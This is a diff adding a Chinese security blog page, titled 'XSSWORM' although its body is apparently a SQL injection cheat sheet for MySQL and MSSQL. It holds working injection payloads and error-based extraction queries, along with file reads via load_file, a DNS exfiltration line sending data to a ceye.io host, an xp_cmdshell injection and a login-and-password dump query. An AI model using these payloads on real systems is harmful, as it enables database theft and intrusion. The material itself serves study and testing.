@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/noel.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/noel.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="对Mysql,Mmsql,PostgreSQL,MongoDB注入做的一些总结">
+<meta name="keywords" content="Web,SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSSWORM">
+<meta property="og:url" content="http://yoursite.com/2019/04/08/sql injection/index.html">
+<meta property="og:site_name" content="Noel&#39;s Blog">
+<meta property="og:description" content="对Mysql,Mmsql,PostgreSQL,MongoDB注入做的一些总结">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-04-08T15:29:49.249Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSSWORM">
+<meta name="twitter:description" content="对Mysql,Mmsql,PostgreSQL,MongoDB注入做的一些总结">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/08/sql injection/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>XSSWORM | Noel's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Noel's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/sql injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Noel">
+      <meta itemprop="description" content="I love u">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Noel's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSSWORM
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-08 00:00:00 / 修改时间：23:29:49" itemprop="dateCreated datePublished" datetime="2019-04-08T00:00:00+08:00">2019-04-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <font color="green">对Mysql,Mmsql,PostgreSQL,MongoDB注入做的一些总结</font><br><a id="more"></a><br><br>### <font color="dark">Mysql</font>
+
+<h4 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h4><p>简单的测试是否存在有漏洞的Payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1</span><br><span class="line">1&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&apos; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&apos; || &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h4 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h4><p>有SQL注入后当然要看下版本信息以及用户信息啦</p>
+<table>
+<thead>
+<tr>
+<th>Version()</th>
+<th>获取数据库版本，也可以用@@version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>user()</td>
+<td>获取数据库当前用户</td>
+</tr>
+<tr>
+<td>@@basedir</td>
+<td>获取MYSQL安装路径</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>读取数据库路径</td>
+</tr>
+</tbody>
+</table>
+<h4 id="数据信息"><a href="#数据信息" class="headerlink" title="数据信息"></a>数据信息</h4><h5 id="确认字段"><a href="#确认字段" class="headerlink" title="确认字段"></a>确认字段</h5><h6 id="Order-By"><a href="#Order-By" class="headerlink" title="Order By"></a>Order By</h6><p>最常见的方式</p>
+<p>字段个数小于输入数的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,id from users where id = -1 order by 3;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;3&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure>
+<p>字段个数大于或等于时候的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,id from users where id = -1 order by 2;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h6 id="Select…Into"><a href="#Select…Into" class="headerlink" title="Select…Into"></a>Select…Into</h6><p>从一个表中选取数据，然后把数据插入另一个表中,要求两表字段数相同，所以可以用这个方法判断出表的字段数</p>
+<p>字段判断错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 into @,@;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>
+<p>判断正确</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 into @;</span><br><span class="line">ERROR 3061 (42000): User variable name &apos;&apos; is illegal</span><br></pre></td></tr></table></figure>
+<p>也有<strong>limit</strong>的时候可以这样子判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 limit 1,1 into @;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username from users where id=1 limit 1,1 into @,@;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure>
+<h5 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h5><h6 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h6><p>当知道字段数以后可以用union查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| username                                |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| emails,logs,referers,uagents,user,users |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h6 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h6><p>使用if,sleep结合其他函数使用</p>
+<h6 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h6><p>通过floor/ceil报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;~emails~1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>ExtractValue</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username from users where id=1 and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:emails,logs,referers,uagents,us&apos;</span><br></pre></td></tr></table></figure>
+<p>updatexml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1062 (23000): Duplicate entry &apos;~emails~1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br><span class="line">mysql&gt; select username from users where id=1 and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:emails,logs,referers,uagents,us&apos;</span><br></pre></td></tr></table></figure>
+<h5 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h5><p>除了用查表名的三种方式外，如果是limit的话还可以用procedure analyse()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users limit 1,1 procedure analyse();</span><br><span class="line">+-------------------------+-----------+------------+------------+------------+------------------+-------+-------------------------+------+------------------------------------+</span><br><span class="line">| Field_name              | Min_value | Max_value  | Min_length | Max_length | Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype                  |</span><br><span class="line">+-------------------------+-----------+------------+------------+------------+------------------+-------+-------------------------+------+------------------------------------+</span><br><span class="line">| security.users.username | Angelina  | Dumb       |          4 |          8 |                0 |     0 | 6.0000                  | NULL | ENUM(&apos;Angelina&apos;,&apos;Dumb&apos;) NOT NULL   |</span><br><span class="line">| security.users.password | Dumb      | I-kill-you |          4 |         10 |                0 |     0 | 7.0000                  | NULL | ENUM(&apos;Dumb&apos;,&apos;I-kill-you&apos;) NOT NULL |</span><br><span class="line">+-------------------------+-----------+------------+------------+------------+------------------+-------+-------------------------+------+------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p><strong>先决条件</strong>：secure_file_priv不为null</p>
+<p>使用@@secure_file_priv查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">|                    |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><p>load_file</p>
+<p>加入我要读取C盘下的test文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(&apos;C:/test&apos;);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| load_file(&apos;C:/test&apos;)               |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 1     2.0     3.0     4       5       6       7       8       9       10      11      12        13</span><br><span class="line"> |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>文件可以用hex编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(0x433A2F74657374);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| load_file(0x433A2F74657374)        |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 1     2.0     3.0     4       5       6       7       8       9       10      11      12        13</span><br><span class="line"> |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>http盲攻击</p>
+<p>利用<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a>之类的平台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file(concat(&quot;\\\\&quot;,@@version,&quot;.d2uj0t.ceye.io\\a&quot;));</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| load_file(concat(&quot;\\\\&quot;,@@version,&quot;.d****t.ceye.io\\a&quot;)) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| NULL                                                     |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">1 row in set (9.50 sec)</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">ID</th>
+<th style="text-align:left">Name</th>
+<th style="text-align:left">Remote Addr</th>
+<th style="text-align:left">Created At (UTC+0)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">7011913</td>
+<td style="text-align:left">5.7.14.<strong>*</strong>.ceye.io</td>
+<td style="text-align:left">127.0.0.1</td>
+<td style="text-align:left">2019-04-08 14:38:13</td>
+</tr>
+</tbody>
+</table>
+<h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><p>INTO OUTFILE</p>
+<h4 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h4><p>如果开启了多句一起执行的模式，可以采用预处理来解决一些过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=&quot;select * from users;&quot;;//可采用ascii编码形如 chr(100,121)，concat可进行连接concat(chr(100,121))</span><br><span class="line">prepare sql from @s;</span><br><span class="line">execute sql;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>后续继续补充</p>
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a><font color="dark">MSSQL</font></h3><p>安装SQL Server的时候出了点儿问题，最后用的VS的本地数据库，可能存在一些问题</p>
+<h4 id="测试语句-1"><a href="#测试语句-1" class="headerlink" title="测试语句"></a>测试语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1 or 1=1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&apos; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&apos; || &apos;1&apos;=&apos;1</span><br><span class="line">&apos;; exec master..xp_cmdshell &apos;ping 10.10.1.2&apos;--</span><br><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&apos; union (select @@version) --</span><br><span class="line">&apos; union (select NULL, (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&apos; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --</span><br></pre></td></tr></table></figure>
+<h5 id="信息获取-1"><a href="#信息获取-1" class="headerlink" title="信息获取"></a>信息获取</h5><table>
+<thead>
+<tr>
+<th>@@VERSION</th>
+<th><strong>获取版本</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>@@SERVERNAME</td>
+<td><strong>获取主机名</strong></td>
+</tr>
+</tbody>
+</table>
+<p>获取用户名及密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user,password from master.dbo.syslogins;</span><br></pre></td></tr></table></figure>
+<h5 id="数据信息-1"><a href="#数据信息-1" class="headerlink" title="数据信息"></a>数据信息</h5><h6 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master..sysdatabases;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>master</td>
+</tr>
+<tr>
+<td>2</td>
+<td>tempdb</td>
+</tr>
+<tr>
+<td>3</td>
+<td>model</td>
+</tr>
+<tr>
+<td>4</td>
+<td>msdb</td>
+</tr>
+<tr>
+<td>5</td>
+<td>C:\USERS\Noel\SOURCE\REPOS\WPFAPP6\WPFAPP6\BIN\DEBUG\DATABASE1.MDF</td>
+</tr>
+</tbody>
+</table>
+<p>报错获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from dbo.MyTable1 where id=0 or 0&lt;&gt;db_name(1);</span><br><span class="line">Msg 245, Level 16, State 1, Line 1</span><br><span class="line">Conversion failed when converting the nvarchar value &apos;master&apos; to data type int.</span><br></pre></td></tr></table></figure>
+<p>将db_name()中的数字改变即可获取不同库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from dbo.MyTable1 where id=0 or 0=(select top 1 table_name from INFORMATION_SCHEMA.TABLES);</span><br><span class="line"></span><br><span class="line">Msg 245, Level 16, State 1, Line 1</span><br><span class="line">Conversion failed when converting the nvarchar value &apos;MyTable1&apos; to data type int.</span><br></pre></td></tr></table></figure>
+<hr>
+<p>后续待补充</p>
+<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a><font color="dark">PostgreSQL</font></h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484788&amp;idx=1&amp;sn=8a53b1c64d864cd01bab095d97a17715&amp;chksm=ec1e355cdb69bc4a2535bc1a053bfde3ec1838d03936ba8e44156818e91bbec9b5b04a744005#rd" target="_blank" rel="noopener">postgresql数据库利用方式 </a> 简单的看了下，还未深入了解，后续补充</p>
+<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a><font color="dark">MongoDB</font></h3><p>暂未安装，后续补充</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+            <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/05/hongcms/" rel="next" title="Hongcms 4.0.0">
+                <i class="fa fa-chevron-left"></i> Hongcms 4.0.0
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Noel</p>
+              <p class="site-description motion-element" itemprop="description">I love u</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">35</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://norw1nd.github.io/" title="Norw1nd" target="_blank">Norw1nd</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://Xvgeng.github.io/" title="Xvgeng" target="_blank">Xvgeng</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#测试语句"><span class="nav-number">1.</span> <span class="nav-text">测试语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#信息获取"><span class="nav-number">2.</span> <span class="nav-text">信息获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据信息"><span class="nav-number">3.</span> <span class="nav-text">数据信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#确认字段"><span class="nav-number">3.1.</span> <span class="nav-text">确认字段</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Order-By"><span class="nav-number">3.1.1.</span> <span class="nav-text">Order By</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Select…Into"><span class="nav-number">3.1.2.</span> <span class="nav-text">Select…Into</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查表名"><span class="nav-number">3.2.</span> <span class="nav-text">查表名</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#union查询"><span class="nav-number">3.2.1.</span> <span class="nav-text">union查询</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#盲注"><span class="nav-number">3.2.2.</span> <span 